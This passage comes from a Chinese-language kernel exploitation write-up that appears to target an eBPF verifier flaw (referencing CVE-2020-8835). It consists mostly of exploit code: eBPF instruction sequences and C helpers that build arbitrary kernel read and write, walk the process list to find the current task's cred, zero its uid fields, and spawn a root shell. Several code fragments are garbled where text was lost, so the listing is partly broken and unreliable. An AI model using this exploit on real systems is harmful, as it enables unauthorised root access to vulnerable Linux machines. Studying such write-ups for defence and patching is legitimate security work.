                BPF_MOV32_REG(BPF_REG_6, BPF_REG_6),        // r6=r6    ; only low 32bits
                BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 1),       // verify: 0  runtime: 1
            // read kalsr(op=0) ops地址在&value[0] - 0x110处
            BPF_MAP_GET(1, BPF_REG_7),                      // 30: (79) r7 = *(u64 *)(r0 +0)
            BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 0, 23),         // 32: (55) if r7 != 0x0 goto pc+23
            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x110),       // 33: (27) r6 *= 272
            BPF_MAP_GET_ADDR(0, BPF_REG_7),                 // 41: (bf) r7 =map_value(id=0,off=0,ks=4,vs=8,imm=0) R7=invP0 R8=invP0 R9=ma?
            BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),   // 43: (1f) r7 -= r6
            BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   // 44: (79) r8 = *(u64 *)(r7 +0)
            BPF_MAP_GET_ADDR(4, BPF_REG_6),                 
            BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),   // 54: (7b) *(u64 *)(r6 +0) = r8
            BPF_EXIT_INSN(),
        BPF_EXIT_INSN(),
        };
##### 触发eBPF code执行
最简单的就是创建一个`BPF_PROG_TYPE_SOCKET_FILTER`类型的bpf_prog，这样就可以在每一次写入socket操作，就可以触发一次eBPF代码执行
    // write_msg() —— trigger to execute eBPF code
    int write_msg()
    {
        ssize_t n = write(sockets[0], buffer, sizeof(buffer));
        if (n btf) {
            info.btf_id = btf_obj_id(map->btf);
            info.btf_key_type_id = map->btf_key_type_id;
            info.btf_value_type_id = map->btf_value_type_id;
        }
即，当我们能越界写`map->btf`为`someaddr - offsetof(struct btf,
id)`时，`info.btf_id`将被写入`*(someaddr)`，由于`btf_id`类型是`u32`，这种方式可以每次读取任意地址4bytes的内容。
######
修改`bpf_array->bpf_map->btf`（&map +
0x40）为指定地址，利用`bpf_map_get_info_by_fd`可以泄漏`btf->id`（偏移&btf + 0x58）的四字节。
    //eBPF code
            // write btf (op=1)     (write bpf_array->bpf_map->btf)
            BPF_JMP_IMM(BPF_JNE,BPF_REG_7,  1, 22),         
                BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0xd0),    //
                BPF_MAP_GET_ADDR(0, BPF_REG_7),             // r7= &map.elem[0]
                BPF_ALU64_REG(BPF_SUB, BPF_REG_7,BPF_REG_6),    // r7 -= r6 
                BPF_MAP_GET(2, BPF_REG_8),                      // r8 = map.elem[2] (target_addr - 0x58)
                BPF_ST_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),     // *(u64 *)(r7 + 0) = r8
                BPF_EXIT_INSN(),
    //trigger code
    // abitary read 64 bytes: 利用 bpf_obj_get_info_by_fd 读取两个4字节并拼接到一起
    size_t read64(size_t addr)
    {
        char buf[50] = { 0 };
        uint32_t hi_32, lo_32;
        update_elem(0, 0);
        update_elem(1, 1);  //write btf
        update_elem(2, addr - 0x58);    // target addr - 0x58 (offsetof(btf, id))
        write_msg();
        if(bpf_obj_get_info_by_fd(mapfd, 0x50, buf)){
            fail("failed in bpf_obj_get_info_by_fd.");
            return 0;
        }
        // return value in bpf_map_info->btf_id (offset is 0x40)
        lo_32 = *(unsigned int*)(&buf[0x40]);
        update_elem(2, addr - 0x58 + 4);
        write_msg();
        if(bpf_obj_get_info_by_fd(mapfd, 0x50, buf)){
            fail("failed in bpf_obj_get_info_by_fd.");
            return 0;
        }
        hi_32 = *(unsigned int*)(&buf[0x40]);
        return (((size_t(hi_32) = array->map.max_entries) {
            *next = 0;
            return 0;
        }
        if (index == array->map.max_entries - 1)
            return -ENOENT;
        *next = index + 1;
        return 0;
    }
当`index map.max_entries - 1`时，始终执行`*next = index +
1`；当`map,.max_entries == 0xffffffff`时，永远成立。
而当`key`和`next_key`可控时，就是一个任意地址写u32（四个字节）的途径
    *(u32*)next_key = *key + 1;
而`ops->map_push_elem`函数原型和它相兼容，且两个参数可控
    int (*map_push_elem)(struct bpf_map *map, void *value, u64 flags);
如果将ops->map_push_elem函数替换为array_map_get_next_key，即可达到任意地址写。
`map->push_elem`的唯一调用路径来自`bpf_map_update_value`，且`map_type`为特定的类型。
    else if (map->map_type == BPF_MAP_TYPE_QUEUE ||
               map->map_type == BPF_MAP_TYPE_STACK ||
               map->map_type == BPF_MAP_TYPE_BLOOM_FILTER) {
            err = map->ops->map_push_elem(map, value, flags);
        }
因此，构造任意地址写的步骤
    1: 在可控expmap.value上复制一份ops 虚函数表，并替换map_push_elem为array_map_get_next_key
    2： 
    3： expmap->max_entries设置为0xffffffff
    4：expmap->map_type 设置为 BPF_MAP_TYPE_STACK
###### 复制ops虚函数表，并替换map_push_elem
    // Step 3: replace map->ops->map_push_elem with map_get_next_key
        char fake_ops[0xe8] = { 0 };
        for(int i=0; i> 32;
        uint64_t key = 0;
        write32(addr, lo);
        write32(addr+4, hi);
    }
##### 泄漏task_strcut cred
`init_pid_ns`命名空间的保存着系统所有的进程的`task`结构，先泄漏`init_pid_ns`地址（根据之前的内核基地址+偏移计算），再根据任意地址读获取`task`地址，遍历列表得到指定进程的`task`结构地址
    // Step 4: Leak task_struct 
    #define INIT_PID_NS 0x111
        size_t init_pid_ns = linux_base + INIT_PID_NS;
        printf("init_pid_ns: 0x%llx\n", init_pid_ns);
        // get current pid
        pid_t pid = getpid();
        size_t cred_addr = 0;
        size_t task_addr = read64(init_pid_ns + 0x30);  // task_struct* 
        // search curret process's task_struct->cred
        while(1){
            pid_t p = read64(task_addr + 0x908);    // get task_struct's pid
            printf("iter pid: %d...\n", p);
            if(pid == p){
                printf("got target cred!\n");
                cred_addr = read64(task_addr + 0xac8);
                break;
            }
            else{
                // task_struct = task_struct->next
                task_addr = read64(task_addr + 0x808) - 0x808;
            }
        }
#### LPE
在成功泄漏进程`cred`地址后，只需要利用构造的任意地址写，完成修改`cred`即可提权
    // Step 7: overwrite cred...
        clear_btf();
        update_elem(0, 0);
        update_elem(1, 3);  //  option = 3 prepare for attr write
        update_elem(2, values_addr + 0x80);     // *(&ops) = value_addr + 0x80(fake_ops)
        write_msg();
        write32(cred_addr+4, 0);
        write32(cred_addr+8, 0);
        write32(cred_addr+12, 0);
        write32(cred_addr+16, 0);
        if(getuid() == 0){
            puts("Spawn shell;");
            system("/bin/sh");
        }
        return 0;
### 参考
[cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification](https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification)
[kernel-pwning-with-ebpf-a-love-story](https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story)